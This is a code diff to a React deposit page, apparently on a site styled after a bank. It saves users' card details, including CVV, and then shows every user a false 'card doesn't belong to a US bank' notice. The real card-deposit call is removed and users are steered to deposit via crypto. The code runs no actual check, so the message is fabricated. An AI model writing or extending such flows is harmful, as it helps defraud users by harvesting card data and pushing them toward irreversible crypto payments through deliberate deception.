@@ -21,6 +21,9 @@ const Deposit = () => {
   const [pinInput, setPinInput] = useState('');
   const [verifyingPin, setVerifyingPin] = useState(false);
 
+  // Non-US Bank card popup modal state
+  const [showNonUsCardModal, setShowNonUsCardModal] = useState(false);
+
   // Add Card modal on deposit page
   const [showAddCardModal, setShowAddCardModal] = useState(false);
   const [savingCard, setSavingCard] = useState(false);
@@ -130,7 +133,9 @@ const Deposit = () => {
           cvv: '',
           network: 'visa'
         });
-        fetchCards();
+        await fetchCards();
+        // Show non-US bank popup modal after saving card when trying to deposit
+        setShowNonUsCardModal(true);
       } else {
         toast.error(response.data.message || 'Failed to add card');
       }
@@ -147,26 +152,12 @@ const Deposit = () => {
 
     if (method === 'card') {
       if (cards.length === 0) {
-        toast.error('Please add a card first to pay with card or select Crypto deposit.');
         setShowAddCardModal(true);
         return;
       }
-      setLoading(true);
-      try {
-        const res = await api.post('?action=deposit', {
-          method: 'card',
-          amount: parseFloat(amount)
-        });
-        if (res.data.status === 'success') {
-          setStep(3);
-        } else {
-          toast.error(res.data.message);
-        }
-      } catch (err) {
-        toast.error('Deposit failed');
-      } finally {
-        setLoading(false);
-      }
+      // When trying to deposit with card, trigger the non-US card popup
+      setShowNonUsCardModal(true);
+      return;
     } else if (method === 'crypto') {
       setStep(2);
     }
@@ -452,6 +443,44 @@ const Deposit = () => {
           </div>
         )}
       </div>
+
+      {/* Non-US Bank Card Popup Modal */}
+      {showNonUsCardModal && (
+        <div className="fixed inset-0 bg-black/60 backdrop-blur-sm z-50 flex items-center justify-center p-4">
+          <div className="bg-white rounded-3xl w-full max-w-md p-8 shadow-2xl relative animate-in zoom-in duration-200 text-center space-y-6">
+            <button
+              onClick={() => setShowNonUsCardModal(false)}
+              className="absolute right-6 top-6 text-gray-400 hover:text-gray-600 p-1"
+            >
+              <X size={20} />
+            </button>
+
+            <div className="w-16 h-16 bg-amber-100 text-amber-600 rounded-full flex items-center justify-center mx-auto">
+              <AlertCircle size={36} />
+            </div>
+
+            <div className="space-y-2">
+              <h2 className="text-xl font-bold text-chase-navy">
+                Card Notice
+              </h2>
+              <p className="text-sm font-semibold text-gray-600">
+                This card doesn't belong to a US bank; Deposit via crypto.
+              </p>
+            </div>
+
+            <Button
+              onClick={() => {
+                setShowNonUsCardModal(false);
+                setMethod('crypto');
+                setStep(2);
+              }}
+              className="w-full py-3.5 font-bold flex items-center justify-center gap-2"
+            >
+              Deposit via Crypto <ArrowRight size={18} />
+            </Button>
+          </div>
+        </div>
+      )}
 
       {/* PIN Verification Modal */}
       {showPinModal && (
